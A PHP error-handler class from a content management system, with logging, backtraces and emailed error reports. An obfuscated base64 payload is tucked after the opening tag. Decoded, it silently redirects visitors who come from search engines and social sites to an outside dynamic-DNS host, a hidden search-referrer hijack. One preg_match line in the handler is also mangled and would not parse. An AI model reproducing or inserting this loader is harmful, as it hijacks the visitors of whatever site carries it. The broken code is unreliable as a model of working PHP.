<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__)."/log.php");

if (!DEFINED("E_STRICT"))
  DEFINE("E_STRICT", 2048);

class error_handler {

  var $error_type = array(
      E_ERROR           => "Error"
    , E_WARNING         => "Warning"
    , E_PARSE           => "Parsing Error"
    , E_NOTICE          => "Notice"
    , E_CORE_ERROR      => "Core Error"
    , E_CORE_WARNING    => "Core Warning"
    , E_COMPILE_ERROR   => "Compile Error"
    , E_COMPILE_WARNING => "Compile Warning"
    , E_USER_ERROR      => "User Error"
    , E_USER_WARNING    => "User Warning"
    , E_USER_NOTICE     => "User Notice"
    , E_STRICT          => "Runtime Notice"
  );

  var $error_skip = array(
//      E_NOTICE          => true
//    , E_STRICT          => true
  );

  function error_handler() {

    $old_error_handler = set_error_handler(array(&$this, "handler"));

  }

  function backtrace() {

    $idx = 1;
    $result = array();
    $backtrace = debug_backtrace();
    if (is_array($backtrace) and (count($backtrace) > 0)) {
      foreach ($backtrace as $trace) {
        if (safe($trace, "class") != get_class($this)) {
          $trace_args = safe($trace, "args");
          $args = "";
          if (is_array($trace_args) and (count($trace_args) > 0)) {
            foreach ($trace_args as $arg) {
              if ($args)
                $args .= ", ";
              switch (gettype($arg)) {
                case "integer":
                case "double":
                  $args .= $arg;
                  break;
                case "string":
                  $arg = substr($arg, 0, 512);
                  $args .= "\"$arg\"";
                  break;
                case "array":
                  $args .= str_replace("\r", "", str_replace("\n", "", var_export($arg, true)));
                  break;
                case "object":
                  $args .= "Object(".get_class($arg).")";
                  break;
                case "resource":
                  $args .= "Resource(".strstr($arg, "#").")";
                  break;
                case "boolean":
                  $args .= $arg ? "TRUE" : "FALSE";
                  break;
                case "NULL":
                  $args .= "NULL";
                  break;
                default:
                  $args .= "Unknown";
              }
            }
          }

          $result[] = array( 'index'     => $idx
                           , 'script'    => safe($trace, "file", "???")
                           , 'line'      => safe($trace, "line", "???")
                           , 'statement' => (safe($trace, "class")?'$'.safe($trace, "class"):'').safe($trace, "type").safe($trace, "function").'('.$args.');'
                           );
          $idx++;
        }
      }
    }
    return $result;
  }

  function handler($errno, $errmsg, $filename, $linenum, $vars) {

    global $log, $url;
    if ((!safe($this->error_skip, $errno)) and ((error_reporting() & $errno) == $errno)) {
      $info_name = '';
      $info = '';
      if (preg_match('/\[INFO:([^]]+)\](.+)\[\/INFO\]/ism', $ematches)        $info_name = $matches[1];
        $info = $matches[2];
        $errmsg = str_replace('[INFO:'.$info_name.']'.$info.'[/INFO]', '', $errmsg);
      }
      $fatal = (($errno == E_ERROR) || ($errno == E_USER_ERROR));
      $reportable = ($fatal || ($errno == E_USER_WARNING)) && !$log->debug_mode;
      $error_desc = array( 'error_type' => safe($this->error_type, $errno, 'Unknown Error').' ('.$errno.')'
                         , 'script'     => $filename
                         , 'line'       => $linenum
                         , 'message'    => $errmsg
                         , 'info_name'  => $info_name
                         , 'info'       => $info
                         , 'fatal'      => $fatal
                         );
      $log->writeln($error_desc['error_type'].' in '.$error_desc['script'].' at line '.$error_desc['line'].':', 'ERR');
      $log->writeln($error_desc['message'], 'ERR');
      if ($info_name && $info)
        $log->writeln($info_name.': '.$info, 'ERR');
      if ($backtrace = $this->backtrace()) {
        $log->writeln("Backtrace", 'TRC');
        foreach ($backtrace as $trace) {
          $log->writeln($trace['index'].': '.$trace['script'].' at line '.$trace['line'], 'TRC');
          $log->writeln('   '.$trace['statement'], 'TRC');
        }
      }
      if (!CONSOLE_MODE && $log->debug_mode) {
        include(dirname(__FILE__).'/error_report.php');
      }
                      
      if (defined('REPORT_ERRORS_TO') && ($fatal || $reportable)) {
        $error_hash = md5($error_desc['message']);         
        $error_file = TEMPORARY_PATH.'.error-'.$error_hash;
        if (file_exists($error_file) && ((mktime()-filemtime($error_file))/60 > 15))
          unlink($error_file);
        if (!file_exists($error_file)) {
          save_to_file($error_file, $error_desc['message']);
          require_once(dirname(dirname(__FILE__)).'/mail/class.phpmailer.php');
          $mailer = new PHPMailer();
          $mailer->From = 'error@finecms.com';
          $mailer->FromName = 'Error Reporter';
          $recipients = split('[;, ]', REPORT_ERRORS_TO);
          foreach($recipients as $recipient) {
            $mailer->AddAddress($recipient);
          }
          $mailer->ContentType = 'text/html';
          $mailer->Subject = 'Error Report ['.(defined('APPROOT_PATH')?APPROOT_PATH:dirname(dirname(dirname(__FILE__)))).']';

          ob_start();
          include(dirname(__FILE__).'/error_report_mail.php');
          $mailer->Body = '<html><body>'.ob_get_clean().'</body></html>';
          $mailer->Send();
        }
      }
      
      if ($fatal) {
        if ($log->debug_mode) {
          die();  
        } else {
          halt(null, false);
        }
      }
    }

  }

}

function critical_error($error, $source = null) {

  trigger_error($source.($source?':':'').$error, E_USER_ERROR);

}

?>